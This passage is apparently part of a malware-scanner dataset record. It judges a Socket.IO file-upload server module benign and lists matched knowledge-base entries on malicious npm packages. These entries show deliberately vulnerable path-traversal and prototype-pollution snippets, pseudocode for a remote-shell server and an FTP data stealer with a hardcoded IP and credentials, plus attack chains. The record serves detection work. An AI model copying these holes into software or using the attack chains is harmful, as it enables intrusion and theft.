{\n\t\t\t\t\tbuffer = new Buffer(data.content, \"base64\");\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tbuffer = new Buffer(data.content);\n\t\t\t\t}\n\n\t\t\t\tfileInfo.size = data.size;\n\t\t\t\tfileInfo.bytesLoaded += buffer.length;\n\t\t\t\tif (self.maxFileSize !== null\n\t\t\t\t\t\t&& fileInfo.bytesLoaded > self.maxFileSize) {\n\t\t\t\t\tfileInfo.success = false;\n\t\t\t\t\tsocket.emit(_getTopicName(\"_error\"), _wrapData({\n\t\t\t\t\t\tid: data.id,\n\t\t\t\t\t\tmessage: \"Max allowed file size exceeded\"\n\t\t\t\t\t}, \"error\"));\n\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\terror: new Error(\"Max allowed file size exceeded\"),\n\t\t\t\t\t\tmemo: \"self-thrown from progress event\"\n\t\t\t\t\t});\n\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif (fileInfo.writeStream) {\n\t\t\t\t\t\tif (!fileInfo.writeStream.write(buffer) && self.emitChunkFail) {\n\t\t\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\t\t\terror: new Error(\"Write of chunk failed (ENOSPC?)\"),\n\t\t\t\t\t\t\t\tmemo: \"self-thrown from progress event\"\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsocket.emit(_getTopicName(\"_chunk\"), _wrapData({ id: data.id }, \"chunk\"));\n\t\t\t\tself.emit(\"progress\", {\n\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\tbuffer: buffer\n\t\t\t\t});\n\t\t\t}\n\t\t\tcatch (err) {\n\t\t\t\tconsole.log(\"SocketIOFileUploadServer Error (_uploadProgress):\");\n\t\t\t\tconsole.log(err);\n\t\t\t}\n\t\t};\n\t};\n\n\tvar _uploadStart = function (socket) {\n\t\treturn function (data) {\n\n\t\t\tvar fileInfo = {\n\t\t\t\tname: data.name,\n\t\t\t\tmtime: new Date(data.mtime),\n\t\t\t\tencoding: data.encoding,\n\t\t\t\tclientDetail: {},\n\t\t\t\tmeta: data.meta || {},\n\t\t\t\tid: data.id,\n\t\t\t\tsize: data.size,\n\t\t\t\tbytesLoaded: 0,\n\t\t\t\tsuccess: true\n\t\t\t};\n\t\t\tfiles[data.id] = fileInfo;\n\n\t\t\tself.emit(\"start\", {\n\t\t\t\tfile: fileInfo\n\t\t\t});\n\n\t\t\tif (!files[data.id]) {\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\tself.uploadValidator({ file: fileInfo }, function( isValid ){\n\t\t\t\tif ( !isValid ) {\n\t\t\t\t\tself.abort( data.id, socket );\n\t\t\t\t} else {\n\t\t\t\t\tif (!self.dir) {\n\t\t\t\t\t\tsocket.emit(_getTopicName(\"_ready\"), _wrapData({\n\t\t\t\t\t\t\tid: data.id,\n\t\t\t\t\t\t\tname: null\n\t\t\t\t\t\t}, \"ready\"));\n\t\t\t\t\t} else {\n\t\t\t\t\t\t_serverReady(socket, data, fileInfo);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t};\n\t};\n\n\tvar _serverReady = function(socket, data, fileInfo){\n\t\t\t_findFileName(fileInfo, function (err, newBase, pathName) {\n\t\t\t\tif (!files[data.id]) {\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tif (err) {\n\t\t\t\t\t_emitComplete(socket, data.id, false);\n\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\terror: err,\n\t\t\t\t\t\tmemo: \"computing file name\"\n\t\t\t\t\t});\n\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tfiles[data.id].base = newBase;\n\t\t\t\tfiles[data.id].pathName = pathName;\n\n\t\t\t\ttry {\n\t\t\t\t\tvar writeStream = fs.createWriteStream(pathName, {\n\t\t\t\t\t\tmode: self.mode\n\t\t\t\t\t});\n\t\t\t\t\twriteStream.on(\"open\", function () {\n\t\t\t\t\t\tif (!files[data.id]) {\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tsocket.emit(_getTopicName(\"_ready\"), _wrapData({\n\t\t\t\t\t\t\tid: data.id,\n\t\t\t\t\t\t\tname: newBase\n\t\t\t\t\t\t}, \"ready\"));\n\t\t\t\t\t});\n\t\t\t\t\twriteStream.on(\"error\", function (err) {\n\t\t\t\t\t\tif (!files[data.id]) {\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_emitComplete(socket, data.id, false);\n\t\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\t\terror: err,\n\t\t\t\t\t\t\tmemo: \"from within write stream\"\n\t\t\t\t\t\t});\n\t\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t\t});\n\t\t\t\t\tfiles[data.id].writeStream = writeStream;\n\t\t\t\t}\n\t\t\t\tcatch (err) {\n\t\t\t\t\t_emitComplete(socket, data.id, false);\n\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\terror: err,\n\t\t\t\t\t\tmemo: \"creating write stream\"\n\t\t\t\t\t});\n\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t});\n\t};\n\n\tvar _cleanupFile = function (id) {\n\t\tvar fileInfo = files[id];\n\t\tif (fileInfo.writeStream) {\n\t\t\tfileInfo.writeStream.end();\n\t\t}\n\t\tdelete files[id];\n\t};\n\n\tvar _cleanupFile1 = function (id) {\n\t\tvar fileInfo = files[id];\n\t\tif (fileInfo.writeStream) {\n\t\t\tfileInfo.writeStream.end();\n\t\t}\n\t};\n\tvar _cleanupFile2 = function (id) {\n\t\tdelete files[id];\n\t};\n\n\tvar _onDisconnect = function (socket) {\n\t\treturn function () {\n\t\t\tfor (var id in files) {\n\t\t\t\tif (files.hasOwnProperty(id)) {\n\t\t\t\t\tvar fileInfo = files[id];\n\t\t\t\t\tself.emit(\"error\", {\n\t\t\t\t\t\tfile: fileInfo,\n\t\t\t\t\t\terror: new Error(\"Client disconnected in the middle of an upload\"),\n\t\t\t\t\t\tmemo: \"disconnect during upload\"\n\t\t\t\t\t});\n\t\t\t\t\t_cleanupFile(id);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t};\n\t};\n\n\tthis.listen = function (socket) {\n\t\tif(_isWrapDataWellConfigured() && self.wrapData) {\n\t\t\tvar actionToMethods = {\n\t\t\t\tstart: _uploadStart(socket),\n\t\t\t\tprogress: _uploadProgress(socket),\n\t\t\t\tdone: _uploadDone(socket)\n\t\t\t};\n\t\t\tsocket.on(self.topicName, function(message) {\n\t\t\t\tif (typeof message !== \"object\") {\n\t\t\t\t\tconsole.log(\"SocketIOFileUploadServer Error: You choose to wrap your data so the message from the client need to be an object\");\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tvar actionKey = self.wrapData.unwrapKey && typeof self.wrapData.unwrapKey.action === \"string\" ? self.wrapData.unwrapKey.action : \"action\";\n\t\t\t\tvar messageKey = self.wrapData.unwrapKey && typeof self.wrapData.unwrapKey.message === \"string\" ? self.wrapData.unwrapKey.message : \"message\";\n\n\t\t\t\tvar action = message[actionKey];\n\t\t\t\tvar data = message[messageKey];\n\t\t\t\tif(!action || !data || !actionToMethods[action]) {\n\t\t\t\t\tconsole.log(\"SocketIOFileUploadServer Error: You choose to wrap your data but the message from the client is wrong configured. Please check the message and your wrapData option\");\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tactionToMethods[action](data);\n\t\t\t});\n\t\t} else {\n\t\t\tsocket.on(self.topicName + \"_start\", _uploadStart(socket));\n\t\t\tsocket.on(self.topicName + \"_progress\", _uploadProgress(socket));\n\t\t\tsocket.on(self.topicName + \"_done\", _uploadDone(socket));\n\t\t}\n\n\t\tsocket.on(\"disconnect\", _onDisconnect(socket));\n\t};\n\n\tthis.abort = function (id, socket) {\n\t\tif (!socket) {\n\t\t\tthrow new Error(\"Please pass the socket instance as the second argument to abort()\");\n\t\t}\n\n\t\tvar fileInfo = files[id];\n\t\tif (!fileInfo) {\n\t\t\tthrow new Error(\"File with specified ID does not exist: \" + id);\n\t\t}\n\n\t\tfileInfo.success = false;\n\t\tsocket.emit(_getTopicName(\"_error\"), _wrapData({\n\t\t\tid: id,\n\t\t\tmessage: \"File upload aborted by server\"\n\t\t}, \"error\"));\n\t\t_cleanupFile(id);\n\t};\n\n\tif (this.exposePrivateFunction) {\n\t\tthis.uploadStart = function (socket, data) {\n\t\t\treturn _uploadStart(socket)(data);\n\t\t};\n\t\tthis.uploadProgress = function (socket, data) {\n\t\t\treturn _uploadProgress(socket)(data);\n\t\t};\n\t\tthis.uploadDone = function (socket, data) {\n\t\t\treturn _uploadDone(socket)(data);\n\t\t};\n\t}\n}\nutil.inherits(SocketIOFileUploadServer, EventEmitter);\n\nvar _serve = function (res) {\n\t\"use strict\";\n\n\tfs.readFile(__dirname + \"/client.min.js\", function (err, data) {\n\t\tif (err) throw err;\n\t\tres.writeHead(200, {\n\t\t\t\"Content-Type\": \"text/javascript\"\n\t\t});\n\t\tres.write(data);\n\t\tres.end();\n\t});\n};\n\nSocketIOFileUploadServer.clientPath = \"/siofu/client.js\";\n\nSocketIOFileUploadServer.listen = function (app) {\n\t\"use strict\";\n\n\tapp.on(\"request\", function (req, res) {\n\t\tif (req.url === SocketIOFileUploadServer.clientPath) {\n\t\t\t_serve(res);\n\t\t}\n\t});\n};\n\nSocketIOFileUploadServer.router = function (req, res, next) {\n\t\"use strict\";\n\n\tif (req.url === SocketIOFileUploadServer.clientPath) {\n\t\t_serve(res);\n\t}\n\telse {\n\t\tnext();\n\t}\n};\n\nmodule.exports = SocketIOFileUploadServer;",
+          "is_malicious": false,
+          "malice_score": 0.4831602036952973,
+          "confidence": 0.1,
+          "behavior_summary": "Upon receiving file upload data via Socket.IO, the code accesses and modifies the local filesystem using fs APIs (open, createWriteStream, utimes, close) to save uploaded files to a configurable directory with specified permissions. It processes incoming data chunks, including base64-decoded content, enforces maximum file size limits, and manages upload lifecycle events (start, progress, done, abort). The code also emits socket events to communicate upload status and errors back to clients, enabling remote file upload handling and storage on the server.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a Socket.IO-based file upload server that handles file uploads from clients, saving them to a configurable directory on the server filesystem. It uses standard Node.js APIs (fs, path) to manage files, enforces file size limits, and emits events to notify clients and the server about upload progress and errors. While it performs sensitive operations such as writing files to disk and handling network data, these are expected behaviors for a file upload server. There is no evidence of obfuscation, unauthorized file access, prototype pollution, or remote shell execution. The code sanitizes filenames to prevent invalid characters and manages upload lifecycle properly. Compared to the known malicious patterns, it does not exhibit prototype pollution (Example 1), unsafe path joining from user input (Example 2), or remote shell/command execution (Example 3). The use of socket events and file writes is legitimate and controlled. Therefore, the code is considered benign with very low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_787969_snippet_1",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787969/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5099984407424927,
+              "code_similarity": 0.5054160356521606,
+              "behavior_similarity": 0.5145809054374695,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.use(fileUpload({ parseNested: true }));",
+                "code_behavior": "At runtime, when handling HTTP file uploads, the code enables the 'parseNested' option, causing uploaded form data to be recursively parsed and assigned to nested object properties, including special properties like '__proto__', resulting in prototype pollution.",
+                "malice_analysis": {
+                  "why_suspicious": "Enabling 'parseNested' without input sanitization allows user-supplied data to modify object prototypes, creating a classic prototype pollution vulnerability.",
+                  "violated_expectations": "Normal file upload handling should not allow user input to affect global object prototypes or application logic; user data should be isolated from core JavaScript object structures.",
+                  "similar_legitimate_use": "Nested parsing is legitimate for complex form data structures, but must be implemented with strict sanitization to prevent prototype pollution.",
+                  "key_indicators": [
+                    "parseNested: true without input sanitization",
+                    "Direct assignment of user data to object keys, including '__proto__'"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling HTTP file uploads)",
+                  "file_location": "application code where express-fileupload is initialized with parseNested: true",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "all versions < 1.1.9 (CVE-2020-7699)",
+                  "why_malicious": "The package contains a critical security flaw in its 'parseNested' option, which allows prototype pollution by recursively parsing and assigning user-supplied form data to object properties, including special properties like '__proto__'. This enables attackers to corrupt global object prototypes, potentially leading to denial-of-service (DoS) or, in certain configurations, remote code execution (RCE) through manipulation of downstream libraries."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends a crafted HTTP multipart/form-data request with a field named '__proto__.toString' or another prototype property.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Prototype pollution in the application"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The express-fileupload module with parseNested: true parses the request and assigns the malicious property to Object.prototype.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Global object prototype is polluted"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Application logic or downstream libraries (such as EJS) are affected by the polluted prototype, potentially leading to denial-of-service or remote code execution.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Denial-of-service or remote shell access"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "HTTP multipart/form-data requests with field names containing '__proto__' or other prototype properties",
+                    "Unexpected modification of Object.prototype properties at runtime",
+                    "Application errors (HTTP 500) or crashes after file upload with parseNested enabled",
+                    "Unusual behavior in downstream libraries (e.g., EJS) following file uploads"
+                  ],
+                  "file_indicators": [
+                    "Usage of app.use(fileUpload({ parseNested: true })) in application code",
+                    "Presence of form fields named '__proto__', '__proto__.toString', or similar in upload requests"
+                  ],
+                  "network_indicators": [
+                    "Inbound HTTP requests with multipart/form-data and suspicious field names targeting prototype properties",
+                    "Outbound connections from Node.js processes (e.g., if a reverse shell is triggered after file upload)"
+                  ],
+                  "how_to_detect": "Monitor HTTP multipart/form-data requests for field names such as '__proto__', '__proto__.toString', or other prototype properties. Audit application code for use of express-fileupload with parseNested: true. Watch for unexpected changes to Object.prototype or frequent HTTP 500 errors after file uploads. In environments using EJS or similar templating engines, monitor for unexpected child_process execution or outbound network connections from the application process, which may indicate remote code execution."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205400_192478_snippet_1",
+              "source_package": "st (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205400_192478/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47437864542007446,
+              "code_similarity": 0.44518938660621643,
+              "behavior_similarity": 0.5035678744316101,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.get('*', function(req, res) {\n  var filePath = path.join(__dirname, req.url);\n  res.sendFile(filePath);\n});",
+                "code_behavior": "At runtime, the server handles incoming HTTP requests by joining the user-supplied URL path to the server's filesystem path using path.join, then serves the resulting file to the client without validating or sanitizing the input, resulting in potential directory traversal and unauthorized file disclosure.",
+                "malice_analysis": {
+                  "why_suspicious": "Directly joining user input (req.url) to filesystem paths without any validation or sanitization allows attackers to craft requests with traversal sequences (e.g., '../') to access files outside the intended directory, such as sensitive system files.",
+                  "violated_expectations": "Normal secure file serving would strictly validate and sanitize user input to ensure only files within a designated public directory are accessible. This code omits such checks, violating the principle of least privilege and safe path handling.",
+                  "similar_legitimate_use": "Serving static files is legitimate when user input is strictly sanitized and restricted to a safe directory. This implementation lacks those safeguards.",
+                  "key_indicators": [
+                    "Use of path.join with unsanitized req.url",
+                    "No validation or sanitization of user-supplied paths",
+                    "Serving files based on direct user input",
+                    "Potential for '../' or URL-encoded traversal sequences in requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (HTTP request handling)",
+                  "file_location": "main server file (e.g., index.js or server.js)",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "st",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example package)",
+                  "why_malicious": "The package exposes a critical directory traversal vulnerability by failing to properly validate and sanitize user-supplied paths in HTTP requests, allowing attackers to access files outside the intended directory. It also contains insecure file download and template rendering logic, enabling further exploitation such as remote content injection and cross-site scripting (XSS)."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts an HTTP request with directory traversal sequences (e.g., '../' or URL-encoded variants) in the URL path to access sensitive files outside the intended directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive file disclosure, such as reading /etc/passwd or application configuration files."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker submits a request to the '/download' endpoint with a malicious or attacker-controlled HTTP URL, causing the server to fetch and relay tampered or malicious content.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution or delivery of attacker-controlled content to clients, enabling further compromise or phishing."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker injects malicious JavaScript or HTML via unescaped template input, exploiting the lack of output encoding.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Cross-site scripting (XSS), session hijacking, or theft of sensitive data from users' browsers."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Direct concatenation or joining of user input (e.g., req.url) to filesystem paths without sanitization",
+                    "Serving files based on unsanitized or unvalidated request URLs",
+                    "Initiating outbound HTTP requests using user-supplied URLs without protocol enforcement",
+                    "Rendering unescaped user input in templates using triple curly braces ({{{ }}})"
+                  ],
+                  "file_indicators": [
+                    "Use of path.join or similar functions with req.url or other user input variables",
+                    "Templates containing triple curly braces ({{{ }}}) bound to user input variables",
+                    "Server files (e.g., index.js, server.js) with sendFile or similar methods using unsanitized paths"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP (not HTTPS) requests to arbitrary domains specified by user input",
+                    "Patterns of serving files from outside the intended public directory",
+                    "Unusual download activity initiated by user-supplied URLs"
+                  ],
+                  "how_to_detect": "Statically analyze server code for instances where user input is joined to filesystem paths without sanitization (e.g., path.join with req.url), or where sendFile is used with unsanitized input. Flag code that uses http.get or similar functions with user-controlled URLs, especially without HTTPS enforcement. Scan template files for triple curly braces ({{{ }}}) bound to user input. Monitor runtime logs for HTTP requests containing directory traversal patterns (../ or %2E%2E) and for outbound HTTP requests to untrusted domains. Combine static and dynamic analysis to identify these patterns and alert on potential exploitation attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46868225932121277,
+              "code_similarity": 0.5075677633285522,
+              "behavior_similarity": 0.4297967553138733,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46749424934387207,
+              "code_similarity": 0.4524897634983063,
+              "behavior_similarity": 0.48249873518943787,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205358_629090_snippet_1",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205358_629090/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45886099338531494,
+              "code_similarity": 0.5191594362258911,
+              "behavior_similarity": 0.39856255054473877,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example vulnerable Node.js code\napp.get('/file', function(req, res) {\n  var file = req.query.file;\n  res.sendFile('/var/www/public/' + file);\n});",
+                "code_behavior": "At runtime, the code concatenates user-supplied input from the HTTP request query parameter to a filesystem path and serves files from the resulting path, enabling directory traversal and unauthorized file access.",
+                "malice_analysis": {
+                  "why_suspicious": "Directly incorporating unvalidated user input into filesystem paths allows attackers to craft requests (e.g., with '../') that access files outside the intended directory, potentially exposing sensitive system files.",
+                  "violated_expectations": "Secure web server code should always sanitize and validate user input before using it in filesystem operations. This code fails to restrict file access to the intended directory, violating the principle of least privilege.",
+                  "similar_legitimate_use": "Serving static files based on user input is a common pattern, but legitimate implementations use path normalization and validation to prevent traversal attacks.",
+                  "key_indicators": [
+                    "Concatenation of user input (e.g., req.query.file) to filesystem paths",
+                    "Absence of input validation or sanitization before file access",
+                    "Use of sendFile or similar APIs with untrusted input",
+                    "No restriction or normalization of file paths"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (HTTP request handling)",
+                  "file_location": "web server route handler or file serving logic (e.g., server.js, app.js)",
+                  "required_permissions": [
+                    "filesystem (read access to server files)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This report does not analyze a specific malicious package, but instead highlights two classes of vulnerabilities—Path Traversal and Regular Expression Denial of Service (ReDoS)—that are commonly exploited in the npm/Node.js ecosystem. No individual package is identified as malicious; rather, the report demonstrates how insecure code patterns can introduce critical security risks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends crafted input to exploit either the path traversal or ReDoS vulnerability via HTTP requests.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
